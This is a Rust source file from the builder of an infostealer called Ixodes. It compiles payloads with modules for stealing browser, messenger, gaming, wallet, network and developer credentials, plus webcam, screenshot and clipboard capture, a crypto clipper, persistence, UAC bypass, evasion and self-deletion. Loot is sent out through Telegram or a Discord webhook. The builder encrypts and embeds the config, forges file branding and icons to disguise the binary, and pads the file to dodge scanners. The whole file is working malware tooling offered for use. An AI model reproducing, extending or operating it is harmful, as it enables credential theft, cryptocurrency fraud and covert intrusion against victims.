use crate::error::{IxodesError};
use crate::models::{BrandingSettings, BuildRequest, BuildResult, PayloadConfig};
use image::GenericImageView;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;
use tauri::path::BaseDirectory;
use tauri::{AppHandle, Manager};

pub fn ixodes_root() -> std::result::Result<PathBuf, IxodesError> {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let repo_root = manifest_dir
        .parent()
        .and_then(|parent| parent.parent())
        .ok_or_else(|| IxodesError::General("failed to locate repo root".into()))?;
    Ok(repo_root.join("ixodes"))
}

pub fn recovery_dir(ixodes_root: &Path) -> PathBuf {
    ixodes_root.join("src").join("recovery")
}

pub fn defaults_path(ixodes_root: &Path) -> PathBuf {
    recovery_dir(ixodes_root).join("defaults.rs")
}

pub fn get_template_cache_key(request: &BuildRequest) -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut hasher = DefaultHasher::new();

    // Hash features only (these require compilation)
    let mut features = Vec::new();
    if request.settings.capture_webcams.unwrap_or(false) { features.push("webcam"); }
    if request.settings.capture_screenshots.unwrap_or(false) { features.push("screenshot"); }
    if request.settings.capture_clipboard.unwrap_or(false) { features.push("clipboard"); }
    if request.settings.persistence.unwrap_or(false) { features.push("persistence"); }
    if request.settings.uac_bypass.unwrap_or(false) { features.push("uac"); }
    if request.settings.evasion.unwrap_or(false) { features.push("evasion"); }
    if request.settings.clipper.unwrap_or(false) { features.push("clipper"); }
    if request.settings.melt.unwrap_or(false) { features.push("melt"); }
    
    // Hash recovery module features
    for category in &request.settings.allowed_categories {
        match category.to_lowercase().as_str() {
            "browser" | "browsers" | "chromium" | "gecko" => features.push("browser"),
            "communication" | "messenger" | "discord" | "email" => features.push("communication"),
            "gaming" | "games" | "steam" => features.push("gaming"),
            "wallet" | "wallets" | "crypto" => features.push("wallet"),
            "system" | "hardware" | "account" => features.push("system"),
            "network" | "ftp" | "rdp" | "vpn" | "wifi" => features.push("network"),
            "devops" | "cloud" | "git" => features.push("devops"),
            _ => {}
        }
    }
    
    features.sort();
    features.dedup();
    features.hash(&mut hasher);

    // Hash build-affecting flags (require compilation)
    request.settings.standalone.hash(&mut hasher);
    request.settings.debug.hash(&mut hasher);

    format!("template_{:x}", hasher.finish())
}

pub fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> std::result::Result<BuildResult, IxodesError> {
    println!("Starting optimized build_ixodes_sync...");
    let ixodes_root = ixodes_root()?;
    let exe_name = if cfg!(windows) { "ixodes.exe" } else { "ixodes" };

    let template_key = get_template_cache_key(&request);
    let cache_dir = ixodes_root.join("target").join("builder_cache");
    let _ = fs::create_dir_all(&cache_dir);
    let cached_template = cache_dir.join(format!("{}.exe", template_key));

    let mut combined = String::new();
    
    // Phase 1: Ensure Template Binary exists
    let template_path = if cached_template.exists() {
        println!("Using cached template: {}", cached_template.display());
        combined.push_str("Found matching pre-compiled feature template in cache. Skipping rebuild.\n");
        cached_template.clone()
    } else {
        println!("No cached template found. Building new template...");
        combined.push_str("No pre-compiled template found for this feature set. Performing full build...\n");
        
        let build_path = ixodes_root.join("target").join("release").join(exe_name);

        let mut command = Command::new("cargo");
        command
            .arg("build")
            .arg("--release")
            .arg("--no-default-features");
        
        // Use a generic resource name for templates; the real ID is injected later
        command.env("IXODES_RESOURCE_NAME", "IXODE_CFG");

        let mut features = Vec::new();
        if request.settings.capture_webcams.unwrap_or(false) { features.push("webcam"); }
        if request.settings.capture_screenshots.unwrap_or(false) { features.push("screenshot"); }
        if request.settings.capture_clipboard.unwrap_or(false) { features.push("clipboard"); }
        if request.settings.persistence.unwrap_or(false) { features.push("persistence"); }
        if request.settings.uac_bypass.unwrap_or(false) { features.push("uac"); }
        if request.settings.evasion.unwrap_or(false) { features.push("evasion"); }
        if request.settings.clipper.unwrap_or(false) { features.push("clipper"); }
        if request.settings.melt.unwrap_or(false) { features.push("melt"); }

        for category in &request.settings.allowed_categories {
            match category.to_lowercase().as_str() {
                "browser" | "browsers" | "chromium" | "gecko" => {
                    if !features.contains(&"browser") { features.push("browser"); }
                }
                "communication" | "messenger" | "discord" | "email" => {
                    if !features.contains(&"communication") { features.push("communication"); }
                }
                "gaming" | "games" | "steam" => {
                    if !features.contains(&"gaming") { features.push("gaming"); }
                }
                "wallet" | "wallets" | "crypto" => {
                    if !features.contains(&"wallet") { features.push("wallet"); }
                }
                "system" | "hardware" | "account" => {
                    if !features.contains(&"system") { features.push("system"); }
                }
                "network" | "ftp" | "rdp" | "vpn" | "wifi" => {
                    if !features.contains(&"network") { features.push("network"); }
                }
                "devops" | "cloud" | "git" => {
                    if !features.contains(&"devops") { features.push("devops"); }
                }
                _ => {}
            }
        }

        if !features.is_empty() {
            command.arg("--features").arg(features.join(" "));
        }

        command.current_dir(&ixodes_root);

        if request.settings.debug.unwrap_or(false) {
            command.env("IXODES_DEBUG", "1");
        }

        if request.settings.standalone.unwrap_or(false) {
            command.env("RUSTFLAGS", "-C target-feature=+crt-static");
        }

        if let Some(branding) = &request.branding {
            apply_branding_env(&app, &mut command, branding)?;
        }

        let output = command.output()?;

        let build_output = String::from_utf8_lossy(&output.stdout);
        combined.push_str(&build_output);
        if !output.stderr.is_empty() {
            combined.push('\n');
            combined.push_str(&String::from_utf8_lossy(&output.stderr));
        }

        if !output.status.success() {
            return Ok(BuildResult {
                success: false,
                output: combined.trim().to_string(),
                exe_path: None,
                moved_to: None,
            });
        }

        fs::copy(&build_path, &cached_template)?;
        
        cached_template
    };

    // Phase 2: Configuration and Branding Injection
    let moved_to = resolve_output_path(&request, exe_name);
    fs::copy(&template_path, &moved_to)?;

    // Derive a stable resource ID for the configuration
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    template_key.hash(&mut hasher);
    let resource_id = (hasher.finish() % 900 + 100) as u16;

    // Build and encrypt the config payload
    let config = build_payload_config(&request);
    let config_json = serde_json::to_string(&config)?;

    use rand::Rng;
    let mut rng = rand::thread_rng();
    let mut key = [0u8; 32];
    rng.fill(&mut key);

    let encrypted_config = xor_codec(config_json.as_bytes(), &key);
    let mut payload = Vec::with_capacity(key.len() + encrypted_config.len());
    payload.extend_from_slice(&key);
    payload.extend_from_slice(&encrypted_config);

    // Perform Injection
    println!("Injecting configuration and branding...");
    inject_differential(&app, &moved_to, &payload, resource_id, &request)?;

    Ok(BuildResult {
        success: true,
        output: combined.trim().to_string(),
        exe_path: Some(template_path.to_string_lossy().to_string()),
        moved_to: Some(moved_to.to_string_lossy().to_string()),
    })
}

pub fn resolve_output_path(request: &BuildRequest, exe_name: &str) -> PathBuf {
    let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
        if output_dir.is_empty() {
            None
        } else {
            let output_path = PathBuf::from(output_dir);
            if output_path.extension().is_some() {
                Some(output_path)
            } else {
                let _ = fs::create_dir_all(&output_path);
                Some(output_path.join(exe_name))
            }
        }
    } else {
        None
    };

    moved_to.unwrap_or_else(|| {
        std::env::var("USERPROFILE")
            .map(PathBuf::from)
            .or_else(|_| std::env::var("HOME").map(PathBuf::from))
            .map(|home| home.join("Desktop").join(exe_name))
            .unwrap_or_else(|_| PathBuf::from(exe_name))
    })
}

pub fn build_payload_config(request: &BuildRequest) -> PayloadConfig {
    PayloadConfig {
        allowed_categories: if request.settings.allowed_categories.is_empty() {
            None
        } else {
            Some(request.settings.allowed_categories.iter().cloned().collect())
        },
        artifact_key: request.settings.artifact_key.clone(),
        capture_screenshots: request.settings.capture_screenshots,
        capture_webcams: request.settings.capture_webcams,
        capture_clipboard: request.settings.capture_clipboard,
        persistence_enabled: request.settings.persistence,
        uac_bypass_enabled: request.settings.uac_bypass,
        evasion_enabled: request.settings.evasion,
        clipper_enabled: request.settings.clipper,
        melt_enabled: request.settings.melt,
        btc_address: request.settings.btc_address.clone(),
        eth_address: request.settings.eth_address.clone(),
        ltc_address: request.settings.ltc_address.clone(),
        xmr_address: request.settings.xmr_address.clone(),
        doge_address: request.settings.doge_address.clone(),
        dash_address: request.settings.dash_address.clone(),
        sol_address: request.settings.sol_address.clone(),
        trx_address: request.settings.trx_address.clone(),
        ada_address: request.settings.ada_address.clone(),
        telegram_token: request.settings.telegram_token.clone(),
        telegram_chat_id: request.settings.telegram_chat_id.clone(),
        discord_webhook: request.settings.discord_webhook.clone(),
        loader_url: request.settings.loader_url.clone(),
        proxy_server: request.settings.proxy_server.clone(),
        pump_size_mb: request.settings.pump_size_mb,
        blocked_countries: request.settings.blocked_countries.as_ref().map(|v| v.iter().cloned().collect()),
        custom_extensions: request.settings.custom_extensions.as_ref().map(|v| v.iter().cloned().collect()),
        custom_keywords: request.settings.custom_keywords.as_ref().map(|v| v.iter().cloned().collect()),
        debug_enabled: request.settings.debug,
        archive_password: request.settings.archive_password.clone(),
    }
}

pub fn inject_differential(
    app: &AppHandle,
    exe_path: &Path,
    config_payload: &[u8],
    config_resource_id: u16,
    request: &BuildRequest,
) -> std::result::Result<(), IxodesError> {
    use windows::core::HSTRING;
    use windows::Win32::System::LibraryLoader::{
        BeginUpdateResourceW, EndUpdateResourceW, UpdateResourceW,
    };

    let exe_path_str = exe_path.to_string_lossy().to_string();
    let exe_path_h = HSTRING::from(&exe_path_str);

    unsafe {
        let h_update = BeginUpdateResourceW(&exe_path_h, false)
            .map_err(|e| IxodesError::Windows(format!("BeginUpdateResourceW failed: {}", e)))?;

        // 1. Inject Encrypted Configuration
        const RT_RCDATA: windows::core::PCWSTR = windows::core::PCWSTR(10 as *const u16);
        UpdateResourceW(
            h_update,
            RT_RCDATA,
            windows::core::PCWSTR(config_resource_id as *const u16),
            0,
            Some(config_payload.as_ptr() as *const _),
            config_payload.len() as u32,
        )
        .map_err(|e| IxodesError::Windows(format!("Failed to inject configuration resource: {}", e)))?;

        // 2. Inject Icon if provided
        if let Some(branding) = &request.branding {
            if let Some(icon_path) = resolve_icon_path(app, branding)? {
                println!("Injecting icon from: {}", icon_path.display());
                inject_icon_resource(h_update, &icon_path)?;
            }
        }

        EndUpdateResourceW(h_update, false)
            .map_err(|e| IxodesError::Windows(format!("EndUpdateResourceW failed: {}", e)))?;
    }

    // 3. Handle file pumping
    if let Some(mb) = request.settings.pump_size_mb {
        if mb > 0 {
            let mut file = fs::OpenOptions::new()
                .write(true)
                .append(true)
                .open(exe_path)?;

            use rand::RngCore;
            let mut rng = rand::thread_rng();
            let chunk_size = 1024 * 1024;
            let mut junk = vec![0u8; chunk_size];
            for _ in 0..mb {
                rng.fill_bytes(&mut junk);
                file.write_all(&junk)?;
            }
        }
    }

    Ok(())
}

pub fn inject_icon_resource(h_update: windows::Win32::Foundation::HANDLE, icon_path: &Path) -> std::result::Result<(), IxodesError> {
    use windows::Win32::System::LibraryLoader::UpdateResourceW;

    let icon_data = fs::read(icon_path)?;
    
    // Simple ICO parser to extract images and group them
    if icon_data.len() < 6 || &icon_data[0..4] != &[0, 0, 1, 0] {
        return Err(IxodesError::Ico("Invalid ICO file format".into()));
    }

    let count = u16::from_le_bytes([icon_data[4], icon_data[5]]) as usize;
    let mut group_data = Vec::with_capacity(6 + count * 14);
    group_data.extend_from_slice(&icon_data[0..6]);

    for i in 0..count {
        let entry_offset = 6 + i * 16;
        let entry = &icon_data[entry_offset..entry_offset + 16];
        
        let width = entry[0];
        let height = entry[1];
        let colors = entry[2];
        let reserved = entry[3];
        let planes = &entry[4..6];
        let bit_count = &entry[6..8];
        let size = &entry[8..12];
        let offset = u32::from_le_bytes([entry[12], entry[13], entry[14], entry[15]]) as usize;
        let size_val = u32::from_le_bytes([entry[8], entry[9], entry[10], entry[11]]) as usize;

        // RT_ICON resource
        const RT_ICON: windows::core::PCWSTR = windows::core::PCWSTR(3 as *const u16);
        let icon_id = (i + 1) as u16;
        
        unsafe {
            UpdateResourceW(
                h_update,
                RT_ICON,
                windows::core::PCWSTR(icon_id as *const u16),
                0,
                Some(icon_data[offset..offset + size_val].as_ptr() as *const _),
                size_val as u32,
            ).map_err(|e| IxodesError::Windows(format!("UpdateResourceW (RT_ICON) failed: {}", e)))?;
        }

        // Add to Group Icon Dir
        group_data.push(width);
        group_data.push(height);
        group_data.push(colors);
        group_data.push(reserved);
        group_data.extend_from_slice(planes);
        group_data.extend_from_slice(bit_count);
        group_data.extend_from_slice(size);
        group_data.extend_from_slice(&icon_id.to_le_bytes()); // ID instead of offset
    }

    // RT_GROUP_ICON resource
    const RT_GROUP_ICON: windows::core::PCWSTR = windows::core::PCWSTR(14 as *const u16);
    unsafe {
        UpdateResourceW(
            h_update,
            RT_GROUP_ICON,
            windows::core::PCWSTR(1 as *const u16), // Main icon usually ID 1
            0,
            Some(group_data.as_ptr() as *const _),
            group_data.len() as u32,
        ).map_err(|e| IxodesError::Windows(format!("UpdateResourceW (RT_GROUP_ICON) failed: {}", e)))?;
    }

    Ok(())
}

pub fn xor_codec(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut output = data.to_vec();
    if key.is_empty() {
        return output;
    }

    for (i, byte) in output.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
    output
}

pub fn get_icon_cache_dir() -> std::result::Result<PathBuf, IxodesError> {
    let ixodes_root = ixodes_root()?;
    let cache_dir = ixodes_root.join("target").join("builder_cache").join("icons");
    let _ = fs::create_dir_all(&cache_dir);
    Ok(cache_dir)
}

pub fn resolve_icon_path(
    app: &AppHandle,
    branding: &BrandingSettings,
) -> std::result::Result<Option<PathBuf>, IxodesError> {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let cache_dir = get_icon_cache_dir()?;
    let target_ext = target_icon_ext();

    if let Some(source) = branding
        .icon_source
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        let mut hasher = DefaultHasher::new();
        source.hash(&mut hasher);
        let hash = hasher.finish();
        let cache_path = cache_dir.join(format!("{:x}.{}", hash, target_ext));

        if cache_path.exists() {
            return Ok(Some(cache_path));
        }

        if source.starts_with("http://") || source.starts_with("https://") {
            let bytes = download_icon(source)?;
            let normalized = normalize_icon_from_bytes(&bytes, target_ext, &cache_path)?;
            return Ok(Some(normalized));
        }

        let path = PathBuf::from(source);
        if path.is_dir() {
            if let Some(candidate) = select_icon_from_dir(&path) {
                let normalized = normalize_icon_from_path(&candidate, target_ext, &cache_path)?;
                return Ok(Some(normalized));
            }
            return Ok(None);
        }
        if path.is_file() {
            let normalized = normalize_icon_from_path(&path, target_ext, &cache_path)?;
            return Ok(Some(normalized));
        }
        return Err(IxodesError::Config(format!("icon path not found: {source}")));
    }

    if let Some(preset) = branding
        .icon_preset
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if preset == "none" {
            return Ok(None);
        }

        let mut hasher = DefaultHasher::new();
        preset.hash(&mut hasher);
        let hash = hasher.finish();
        let cache_path = cache_dir.join(format!("preset-{:x}.{}", hash, target_ext));

        if cache_path.exists() {
            return Ok(Some(cache_path));
        }

        if preset == "tauri-default" {
            let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
            let icon_path = if cfg!(windows) {
                base.join("icons").join("icon.ico")
            } else if cfg!(target_os = "macos") {
                base.join("icons").join("icon.icns")
            } else {
                base.join("icons").join("icon.png")
            };
            if icon_path.exists() {
                let normalized = normalize_icon_from_path(&icon_path, target_ext, &cache_path)?;
                return Ok(Some(normalized));
            }
            return Err(IxodesError::Resource("tauri default icon not found".into()));
        }

        let preset_path = resolve_preset_icon(app, preset)?;
        let normalized = normalize_icon_from_path(&preset_path, target_ext, &cache_path)?;
        return Ok(Some(normalized));
    }

    Ok(None)
}

pub fn select_icon_from_dir(dir: &Path) -> Option<PathBuf> {
    let candidates = if cfg!(windows) {
        ["icon.ico", "app.ico", "ixodes.ico"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else if cfg!(target_os = "macos") {
        ["icon.icns", "app.icns", "ixodes.icns"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else {
        ["icon.png", "app.png", "ixodes.png"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    };

    for candidate in candidates {
        if candidate.exists() {
            return Some(candidate);
        }
    }
    None
}

pub fn download_icon(url: &str) -> std::result::Result<Vec<u8>, IxodesError> {
    let response = reqwest::blocking::get(url)?;
    if !response.status().is_success() {
        return Err(IxodesError::Reqwest(response.error_for_status().unwrap_err()));
    }
    let content_type = response
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .map(|value| value.to_string());
    let bytes = response.bytes()?;

    let _ = icon_extension_from_url(url).or_else(|| {
        content_type
            .as_deref()
            .and_then(icon_extension_from_content_type)
    });

    Ok(bytes.to_vec())
}

pub fn resolve_preset_icon(app: &AppHandle, preset: &str) -> std::result::Result<PathBuf, IxodesError> {
    let exts: &[&str] = if cfg!(windows) {
        &["ico", "png"]
    } else {
        &["png"]
    };

    for ext in exts {
        let rel = Path::new("presets").join(format!("{preset}.{ext}"));
        if let Ok(path) = app.path().resolve(&rel, BaseDirectory::Resource) {
            if path.exists() {
                return Ok(path);
            }
        }

        let dev_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(&rel);
        if dev_path.exists() {
            return Ok(dev_path);
        }
    }

    Err(IxodesError::Resource(format!(
        "preset icon not found: presets/{}.(ico|png)",
        preset
    )))
}

pub fn icon_extension_from_url(url: &str) -> Option<String> {
    let trimmed = url.split('?').next().unwrap_or(url);
    let ext = Path::new(trimmed)
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| ext.to_ascii_lowercase())?;
    if ext == "ico" || ext == "icns" || ext == "png" {
        Some(ext)
    } else {
        None
    }
}

pub fn icon_extension_from_content_type(content_type: &str) -> Option<String> {
    let content_type = content_type.to_ascii_lowercase();
    if content_type.contains("image/x-icon") || content_type.contains("image/vnd.microsoft.icon") {
        Some("ico".to_string())
    } else if content_type.contains("image/icns") {
        Some("icns".to_string())
    } else if content_type.contains("image/png") {
        Some("png".to_string())
    } else {
        None
    }
}

pub fn target_icon_ext() -> &'static str {
    if cfg!(windows) { "ico" } else { "png" }
}

pub fn normalize_icon_from_path(path: &Path, target_ext: &str, cache_path: &Path) -> std::result::Result<PathBuf, IxodesError> {
    if let Some(ext) = path.extension().and_then(|ext| ext.to_str()) {
        if ext.eq_ignore_ascii_case("icns") {
            return Err(IxodesError::Ico("icns files are not supported yet; provide a 256-512px PNG instead".into()));
        }
    }
    let bytes = fs::read(path)?;
    normalize_icon_from_bytes(&bytes, target_ext, cache_path)
}

pub fn normalize_icon_from_bytes(bytes: &[u8], target_ext: &str, cache_path: &Path) -> std::result::Result<PathBuf, IxodesError> {
    if cache_path.exists() {
        return Ok(cache_path.to_path_buf());
    }

    let image = image::load_from_memory(bytes)?;
    let (width, height) = image.dimensions();
    let max_dim = width.max(height);

    if max_dim < 256 || max_dim > 512 {
        return Err(IxodesError::Image(image::ImageError::Parameter(image::error::ParameterError::from_kind(image::error::ParameterErrorKind::Generic("icon must be between 256x256 and 512x512".into())))));
    }

    let mut square_image = image::DynamicImage::new_rgba8(max_dim, max_dim);
    let x_offset = (max_dim - width) / 2;
    let y_offset = (max_dim - height) / 2;
    image::imageops::overlay(&mut square_image, &image, x_offset as i64, y_offset as i64);

    let resized = if max_dim == 256 && width == height {
        image
    } else {
        square_image.resize_exact(256, 256, image::imageops::FilterType::Lanczos3)
    };
    let rgba = resized.to_rgba8();

    if target_ext == "ico" {
        let icon = ico::IconImage::from_rgba_data(256, 256, rgba.into_raw());
        let mut dir = ico::IconDir::new(ico::ResourceType::Icon);
        dir.add_entry(ico::IconDirEntry::encode(&icon).map_err(|err| IxodesError::Ico(err.to_string()))?);
        let mut file = fs::File::create(cache_path)?;
        dir.write(&mut file).map_err(|err| IxodesError::Ico(err.to_string()))?;
    } else {
        rgba.save(cache_path)?;
    }

    Ok(cache_path.to_path_buf())
}

pub fn apply_branding_env(
    app: &AppHandle,
    command: &mut Command,
    branding: &BrandingSettings,
) -> std::result::Result<(), IxodesError> {
    let icon_path = resolve_icon_path(app, branding)?;
    if let Some(icon) = icon_path {
        command.env("IXODES_ICON_PATH", icon.to_string_lossy().to_string());
    }

    set_env_if_present(
        command,
        "IXODES_PRODUCT_NAME",
        branding.product_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_DESCRIPTION",
        branding.file_description.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_COMPANY_NAME",
        branding.company_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_PRODUCT_VERSION",
        branding.product_version.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_VERSION",
        branding.file_version.as_deref(),
    );
    set_env_if_present(command, "IXODES_COPYRIGHT", branding.copyright.as_deref());

    Ok(())
}

fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        command.env(key, value);
    }
}
